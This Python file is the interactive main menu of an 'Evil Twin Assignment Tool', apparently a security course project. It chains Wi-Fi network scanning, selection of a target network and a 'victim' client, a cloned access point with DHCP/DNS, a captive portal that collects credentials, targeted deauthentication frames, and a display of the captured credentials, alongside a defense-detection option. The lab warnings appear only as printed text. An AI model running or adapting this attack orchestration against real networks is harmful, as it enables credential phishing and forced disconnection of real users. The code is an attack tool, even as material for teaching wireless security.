import json
import time
from pathlib import Path
from wifi_utils import require_root, show_wireless_interfaces, set_monitor_mode
from wifi_scan import scan_networks, print_network_table
from defense import print_defense_report
from client_discovery import discover_clients, print_clients_table
from evil_twin_ap import start_evil_twin, stop_evil_twin, show_logs
from targeted_disconnect import targeted_disconnect

"""
Main entry point for the Evil Twin attack and defense tool.

Main responsibilities:
    - Provide the interactive command-line menu.
    - Manage AP and monitor interface selection.
    - Run network discovery and target network selection.
    - Run victim/client discovery and victim selection.
    - Start the Evil Twin access point and captive portal.
    - Execute targeted disconnection against the selected victim.
    - Display captured credentials, logs, attack status, and defense reports.
    - Stop all attack services safely when needed.

Used by:
    The user directly runs this file with sudo.

"""

from captive_portal import (
    start_captive_portal,
    stop_captive_portal,
    show_captured_credentials,
    count_captured_credentials,
    is_portal_running,
)


PROJECT_DIR = Path(__file__).resolve().parent
ATTACK_STATUS_FILE = PROJECT_DIR / "attack_status.json"


def choose_interface() -> str:
    interfaces = show_wireless_interfaces()

    if not interfaces:
        print("[ERROR] No wireless interfaces found.")
        raise SystemExit(1)

    print("\nAvailable wireless interfaces:")
    print("-" * 50)

    for idx, iface in enumerate(interfaces, start=1):
        print(f"[{idx}] {iface}")

    print("-" * 50)

    while True:
        choice = input("Choose interface number: ").strip()

        if not choice.isdigit():
            print("[ERROR] Please enter a number.")
            continue

        index = int(choice)

        if 1 <= index <= len(interfaces):
            selected = interfaces[index - 1]
            print(f"[OK] Selected interface: {selected}")
            return selected

        print("[ERROR] Invalid selection.")


def print_selected_ap_interface(attack_interface) -> None:
    print("\nSelected AP interface:")
    print("-" * 50)
    print(attack_interface or "Not selected")
    print("-" * 50)


def print_selected_monitor_interface(monitor_interface) -> None:
    print("\nSelected monitor interface:")
    print("-" * 50)
    print(monitor_interface or "Not selected")
    print("-" * 50)


def choose_target_network(networks):
    if not networks:
        print("[ERROR] No networks available. Run network discovery first.")
        return None

    network_list = list(networks.values()) if isinstance(networks, dict) else list(networks)

    if not network_list:
        print("[ERROR] Network list is empty.")
        return None

    print("\nDiscovered networks:")
    print("=" * 100)
    print(
        f"{'ID':<4} "
        f"{'SSID':<25} "
        f"{'BSSID':<20} "
        f"{'CH':<5} "
        f"{'SIGNAL':<8} "
        f"{'SECURITY':<20}"
    )
    print("-" * 100)

    for idx, net in enumerate(network_list, start=1):
        ssid = getattr(net, "ssid", "") or "<hidden>"
        bssid = getattr(net, "bssid", "-")
        channel = getattr(net, "channel", "-")
        signal = getattr(net, "signal_dbm", "-")
        security = getattr(net, "security", "-")

        print(
            f"{idx:<4} "
            f"{ssid[:24]:<25} "
            f"{str(bssid):<20} "
            f"{str(channel):<5} "
            f"{str(signal):<8} "
            f"{str(security)[:19]:<20}"
        )

    print("=" * 100)

    while True:
        choice = input("Choose target network number: ").strip()

        if not choice.isdigit():
            print("[ERROR] Please enter a number.")
            continue

        index = int(choice)

        if 1 <= index <= len(network_list):
            selected = network_list[index - 1]

            print("\n[OK] Target network selected:")
            print(f"SSID:     {getattr(selected, 'ssid', None)}")
            print(f"BSSID:    {getattr(selected, 'bssid', None)}")
            print(f"Channel:  {getattr(selected, 'channel', None)}")
            print(f"Signal:   {getattr(selected, 'signal_dbm', None)}")
            print(f"Security: {getattr(selected, 'security', None)}")

            return selected

        print("[ERROR] Invalid selection.")


def print_selected_target(selected_target) -> None:
    print("\nSelected target network:")
    print("=" * 60)

    if selected_target is None:
        print("No target network selected.")
    else:
        print(f"SSID:     {getattr(selected_target, 'ssid', None)}")
        print(f"BSSID:    {getattr(selected_target, 'bssid', None)}")
        print(f"Channel:  {getattr(selected_target, 'channel', None)}")
        print(f"Signal:   {getattr(selected_target, 'signal_dbm', None)}")
        print(f"Security: {getattr(selected_target, 'security', None)}")

    print("=" * 60)


def get_client_mac(client):
    if isinstance(client, str):
        return client

    if isinstance(client, dict):
        for key in ("mac", "client_mac", "station_mac", "sta_mac", "addr", "address"):
            value = client.get(key)
            if value:
                return str(value)

    for attr in ("mac", "client_mac", "station_mac", "sta_mac", "addr", "address"):
        value = getattr(client, attr, None)
        if value:
            return str(value)

    return None


def get_client_field(client, field_names, default="-"):
    if isinstance(client, dict):
        for key in field_names:
            value = client.get(key)
            if value is not None:
                return value

    for attr in field_names:
        value = getattr(client, attr, None)
        if value is not None:
            return value

    return default


def choose_victim_client(client_results):
    if not client_results:
        print("[ERROR] No discovered clients. Run client discovery first.")
        return None

    client_list = list(client_results.values()) if isinstance(client_results, dict) else list(client_results)

    if not client_list:
        print("[ERROR] Client list is empty.")
        return None

    print("\nDiscovered clients:")
    print("=" * 90)
    print(
        f"{'ID':<4} "
        f"{'CLIENT MAC':<20} "
        f"{'SIGNAL':<10} "
        f"{'FRAMES':<10} "
        f"{'INFO':<30}"
    )
    print("-" * 90)

    valid_clients = []

    for client in client_list:
        mac = get_client_mac(client)

        if not mac:
            continue

        signal = get_client_field(client, ["signal", "signal_dbm", "rssi"], "-")
        frames = get_client_field(client, ["frames", "packet_count", "count"], "-")
        info = get_client_field(client, ["info", "summary", "last_seen"], "-")

        valid_clients.append(client)

        print(
            f"{len(valid_clients):<4} "
            f"{mac:<20} "
            f"{str(signal):<10} "
            f"{str(frames):<10} "
            f"{str(info)[:29]:<30}"
        )

    print("=" * 90)

    if not valid_clients:
        print("[ERROR] No clients with valid MAC addresses were found.")
        return None

    while True:
        choice = input("Choose victim client number: ").strip()

        if not choice.isdigit():
            print("[ERROR] Please enter a number.")
            continue

        index = int(choice)

        if 1 <= index <= len(valid_clients):
            selected_client = valid_clients[index - 1]
            selected_mac = get_client_mac(selected_client)

            print("\n[OK] Victim client selected:")
            print(f"Client MAC: {selected_mac}")

            return selected_mac

        print("[ERROR] Invalid selection.")


def print_selected_victim(selected_victim) -> None:
    print("\nSelected victim client:")
    print("-" * 50)
    print(selected_victim or "No victim selected.")
    print("-" * 50)


def start_evil_twin_for_selected_target(attack_interface, selected_target):
    if not attack_interface:
        print("[ERROR] Choose AP interface first.")
        return False

    if selected_target is None:
        print("[ERROR] Choose target network first.")
        return False

    ssid = getattr(selected_target, "ssid", None)
    channel = getattr(selected_target, "channel", None)

    if not ssid or ssid == "<hidden>":
        print("[ERROR] Cannot start Evil Twin for hidden or empty SSID.")
        return False

    if channel is None:
        print("[ERROR] Selected target has no known channel.")
        return False

    print("\nEvil Twin network configuration:")
    print("=" * 70)
    print(f"SSID:         {ssid}")
    print(f"BSSID:        {getattr(selected_target, 'bssid', None)}")
    print(f"Channel:      {channel}")
    print(f"Security:     {getattr(selected_target, 'security', None)}")
    print(f"AP interface: {attack_interface}")
    print("=" * 70)

    password = input("Fake AP WPA password [default 12345678]: ").strip()

    if not password:
        password = "12345678"

    if len(password) < 8 or len(password) > 63:
        print("[ERROR] WPA password must be between 8 and 63 characters.")
        return False

    confirm = input("Start Evil Twin network? [y/N]: ").strip().lower()

    if confirm != "y":
        print("[INFO] Cancelled.")
        return False

    hostapd_proc, dnsmasq_proc = start_evil_twin(
        interface=attack_interface,
        ssid=ssid,
        channel=int(channel),
        password=password,
    )

    if hostapd_proc is None:
        print("[ERROR] Evil Twin AP failed to start.")
        return False

    if dnsmasq_proc is None:
        print("[WARNING] Evil Twin AP started, but DHCP/DNS failed.")
        return True

    print("[OK] Evil Twin AP and DHCP/DNS services started.")
    return True


def start_captive_portal_for_selected_target(selected_target) -> bool:
    if selected_target is None:
        print("[ERROR] Choose target network first.")
        return False

    ssid = getattr(selected_target, "ssid", None)

    if not ssid or ssid == "<hidden>":
        print("[ERROR] Cannot start Captive Portal for hidden or empty SSID.")
        return False

    print("\nCaptive Portal configuration:")
    print("=" * 70)
    print(f"SSID context: {ssid}")
    print("Use this only in the authorized course lab.")
    print("Use demo/test credentials only.")
    print("=" * 70)

    confirm = input("Start Captive Portal? [y/N]: ").strip().lower()

    if confirm != "y":
        print("[INFO] Cancelled.")
        return False

    start_captive_portal(ssid=ssid)

    print("[OK] Captive Portal start command executed.")
    print("[INFO] If the popup does not open automatically, test with an HTTP page.")
    print("[INFO] Example: http://neverssl.com")
    print("[INFO] HTTPS pages may not redirect cleanly because of certificates.")

    return True


def disconnect_selected_victim(monitor_interface, selected_target, selected_victim):
    if not monitor_interface:
        print("[ERROR] Choose monitor interface first.")
        return False

    if selected_target is None:
        print("[ERROR] Choose target network first.")
        return False

    if not selected_victim:
        print("[ERROR] Choose victim client first.")
        return False

    target_bssid = getattr(selected_target, "bssid", None)
    channel = getattr(selected_target, "channel", None)

    if not target_bssid:
        print("[ERROR] Selected target has no BSSID.")
        return False

    if channel is None:
        print("[ERROR] Selected target has no known channel.")
        return False

    print("\nTargeted disconnection configuration:")
    print("=" * 70)
    print(f"Monitor interface: {monitor_interface}")
    print(f"Target SSID:       {getattr(selected_target, 'ssid', None)}")
    print(f"Target BSSID:      {target_bssid}")
    print(f"Target channel:    {channel}")
    print(f"Victim MAC:        {selected_victim}")
    print("=" * 70)

    rounds_input = input("Deauth rounds [default 25]: ").strip()
    rounds = int(rounds_input) if rounds_input.isdigit() else 25

    confirm = input("Disconnect only this selected victim? [y/N]: ").strip().lower()

    if confirm != "y":
        print("[INFO] Cancelled.")
        return False

    result = targeted_disconnect(
        interface=monitor_interface,
        target_bssid=target_bssid,
        client_mac=selected_victim,
        channel=int(channel),
        rounds=rounds,
        interval=0.05,
        bidirectional=True,
    )

    print("\nTargeted disconnection result:")
    print(f"Success:     {getattr(result, 'success', False)}")
    print(f"Frames sent: {getattr(result, 'frames_sent', '-')}")
    print(f"Message:     {getattr(result, 'message', '-')}")

    if not getattr(result, "success", False):
        print("[ERROR] Targeted disconnection failed.")
        return False

    if getattr(result, "frames_sent", 0) == 0:
        print("[ERROR] No frames were sent.")
        return False

    print("[OK] Targeted disconnection frames were sent.")
    return True


def save_attack_status(status: dict) -> None:
    status["updated_at"] = time.strftime("%Y-%m-%d %H:%M:%S")

    ATTACK_STATUS_FILE.write_text(
        json.dumps(status, indent=2, ensure_ascii=False),
        encoding="utf-8",
    )


def build_attack_status(
    attack_interface,
    monitor_interface,
    selected_target,
    selected_victim,
    evil_twin_running=False,
):
    return {
        "attack_interface": attack_interface,
        "monitor_interface": monitor_interface,
        "selected_target": {
            "ssid": getattr(selected_target, "ssid", None),
            "bssid": getattr(selected_target, "bssid", None),
            "channel": getattr(selected_target, "channel", None),
            "security": getattr(selected_target, "security", None),
            "signal_dbm": getattr(selected_target, "signal_dbm", None),
        }
        if selected_target
        else None,
        "selected_victim": selected_victim,
        "evil_twin_ap_running": evil_twin_running,
        "captive_portal_running": is_portal_running(),
        "credentials_captured": count_captured_credentials(),
    }


def print_attack_status(
    attack_interface,
    monitor_interface,
    selected_target,
    selected_victim,
    evil_twin_running=False,
):
    status = build_attack_status(
        attack_interface=attack_interface,
        monitor_interface=monitor_interface,
        selected_target=selected_target,
        selected_victim=selected_victim,
        evil_twin_running=evil_twin_running,
    )

    save_attack_status(status)

    print("\nAttack status:")
    print("=" * 80)
    print(f"AP interface:          {status['attack_interface']}")
    print(f"Monitor interface:     {status['monitor_interface']}")

    if status["selected_target"]:
        target = status["selected_target"]
        print(f"Target SSID:           {target['ssid']}")
        print(f"Target BSSID:          {target['bssid']}")
        print(f"Target channel:        {target['channel']}")
        print(f"Target security:       {target['security']}")
    else:
        print("Target network:        Not selected")

    print(f"Victim client:         {status['selected_victim']}")
    print(f"Evil Twin running:     {status['evil_twin_ap_running']}")
    print(f"Captive Portal:        {status['captive_portal_running']}")
    print(f"Credentials captured:  {status['credentials_captured']}")
    print(f"Status file:           {ATTACK_STATUS_FILE}")
    print("=" * 80)


def stop_all_services(attack_interface) -> None:
    print("\n[INFO] Stopping Captive Portal...")

    try:
        stop_captive_portal()
    except Exception as exc:
        print(f"[WARNING] Could not stop Captive Portal cleanly: {exc}")

    if attack_interface:
        print("[INFO] Stopping Evil Twin services...")

        try:
            stop_evil_twin(attack_interface)
        except Exception as exc:
            print(f"[WARNING] Could not stop Evil Twin services cleanly: {exc}")


def print_main_menu(
    attack_interface,
    monitor_interface,
    selected_target,
    selected_victim,
) -> None:
    print("\n" + "=" * 70)
    print("Evil Twin Assignment Tool")
    print("=" * 70)
    print(f"AP interface:       {attack_interface or 'Not selected'}")
    print(f"Monitor interface:  {monitor_interface or 'Not selected'}")
    print(f"Target network:     {getattr(selected_target, 'ssid', None) or 'Not selected'}")
    print(f"Victim client:      {selected_victim or 'Not selected'}")
    print(f"Captive portal:     {'Running' if is_portal_running() else 'Stopped'}")
    print(f"Credentials saved:  {count_captured_credentials()}")
    print("-" * 70)

    print("[1]  Choose AP interface")
    print("[2]  Show selected AP interface")
    print("[3]  Choose monitor interface")
    print("[4]  Show selected monitor interface")
    print("[5]  Enable monitor mode")

    print("[6]  Network discovery - scan Wi-Fi networks")
    print("[7]  Show discovered networks")
    print("[8]  Choose target network")
    print("[9]  Show selected target network")

    print("[10] Discover clients on target network")
    print("[11] Show discovered clients")
    print("[12] Choose victim client")
    print("[13] Show selected victim client")

    print("[14] Start Evil Twin network")
    print("[15] Start Captive Portal")
    print("[16] Disconnect selected victim")
    print("[17] Show captured credentials")

    print("[18] Stop attack services")
    print("[19] Show Evil Twin logs")
    print("[20] Run defense detection")
    print("[21] Show attack status")

    print("[0]  Exit")
    print("=" * 70)


def main():
    require_root()

    attack_interface = None
    monitor_interface = None

    last_scan_results = {}
    selected_target = None

    last_client_results = {}
    selected_victim = None

    evil_twin_running = False

    while True:
        print_main_menu(
            attack_interface=attack_interface,
            monitor_interface=monitor_interface,
            selected_target=selected_target,
            selected_victim=selected_victim,
        )

        choice = input("Choose option: ").strip()

        if choice == "1":
            attack_interface = choose_interface()

            if monitor_interface and attack_interface == monitor_interface:
                print("[WARNING] AP and monitor interface are the same.")
                print("[WARNING] Usually you should use two different Wi-Fi adapters.")

        elif choice == "2":
            print_selected_ap_interface(attack_interface)

        elif choice == "3":
            monitor_interface = choose_interface()

            if attack_interface and attack_interface == monitor_interface:
                print("[WARNING] AP and monitor interface are the same.")
                print("[WARNING] Usually you should use two different Wi-Fi adapters.")

        elif choice == "4":
            print_selected_monitor_interface(monitor_interface)

        elif choice == "5":
            if not monitor_interface:
                print("[ERROR] Choose monitor interface first.")
                continue

            print(f"\nSelected monitor interface: {monitor_interface}")
            confirm = input("Enable monitor mode on this interface? [y/N]: ").strip().lower()

            if confirm != "y":
                print("[INFO] Cancelled.")
                continue

            result = set_monitor_mode(monitor_interface)

            if isinstance(result, str) and result:
                monitor_interface = result

            print(f"[OK] Monitor mode command executed. Current monitor interface: {monitor_interface}")

        elif choice == "6":
            if not monitor_interface:
                print("[ERROR] Choose monitor interface first.")
                continue

            duration_input = input("Scan duration in seconds [default 60]: ").strip()
            duration = int(duration_input) if duration_input.isdigit() else 60

            print(f"\n[INFO] Scanning Wi-Fi networks for {duration} seconds...")
            print(f"[INFO] Interface: {monitor_interface}")

            last_scan_results = scan_networks(
                interface=monitor_interface,
                duration=duration,
                hop_channels=True,
            )

            print_network_table(last_scan_results)

        elif choice == "7":
            if not last_scan_results:
                print("[INFO] No discovered networks yet. Run option [6] first.")
            else:
                print_network_table(last_scan_results)

        elif choice == "8":
            if not last_scan_results:
                print("[ERROR] No discovered networks yet. Run option [6] first.")
                continue

            selected_target = choose_target_network(last_scan_results)

            last_client_results = {}
            selected_victim = None

        elif choice == "9":
            print_selected_target(selected_target)

        elif choice == "10":
            if not monitor_interface:
                print("[ERROR] Choose monitor interface first.")
                continue

            if selected_target is None:
                print("[ERROR] Choose target network first.")
                continue

            channel = getattr(selected_target, "channel", None)
            bssid = getattr(selected_target, "bssid", None)

            if channel is None:
                print("[ERROR] Selected target has no known channel.")
                continue

            if not bssid:
                print("[ERROR] Selected target has no BSSID.")
                continue

            duration_input = input("Client discovery duration in seconds [default 60]: ").strip()
            duration = int(duration_input) if duration_input.isdigit() else 60

            print(f"\n[INFO] Discovering clients for {duration} seconds...")
            print(f"[INFO] Target BSSID: {bssid}")
            print(f"[INFO] Channel:      {channel}")

            last_client_results = discover_clients(
                interface=monitor_interface,
                target_bssid=bssid,
                channel=int(channel),
                duration=duration,
            )

            print_clients_table(last_client_results)

        elif choice == "11":
            if not last_client_results:
                print("[INFO] No discovered clients yet. Run option [10] first.")
            else:
                print_clients_table(last_client_results)

        elif choice == "12":
            selected_victim = choose_victim_client(last_client_results)

        elif choice == "13":
            print_selected_victim(selected_victim)

        elif choice == "14":
            evil_twin_running = start_evil_twin_for_selected_target(
                attack_interface=attack_interface,
                selected_target=selected_target,
            )

        elif choice == "15":
            start_captive_portal_for_selected_target(selected_target)

        elif choice == "16":
            disconnected = disconnect_selected_victim(
                monitor_interface=monitor_interface,
                selected_target=selected_target,
                selected_victim=selected_victim,
            )

            if disconnected:
                print("[OK] Only the selected victim was targeted.")

        elif choice == "17":
            show_captured_credentials()

        elif choice == "18":
            stop_all_services(attack_interface)
            evil_twin_running = False
            print("[OK] Stop commands executed.")

        elif choice == "19":
            show_logs()

        elif choice == "20":
            if not last_scan_results:
                print("[ERROR] No scan results yet. Run option [6] first.")
                continue

            print_defense_report(last_scan_results)

        elif choice == "21":
            print_attack_status(
                attack_interface=attack_interface,
                monitor_interface=monitor_interface,
                selected_target=selected_target,
                selected_victim=selected_victim,
                evil_twin_running=evil_twin_running,
            )

        elif choice == "0":
            print("[INFO] Exiting. Stopping services first...")
            stop_all_services(attack_interface)
            print("[INFO] Done.")
            break

        else:
            print("[ERROR] Invalid option.")


if __name__ == "__main__":
    main()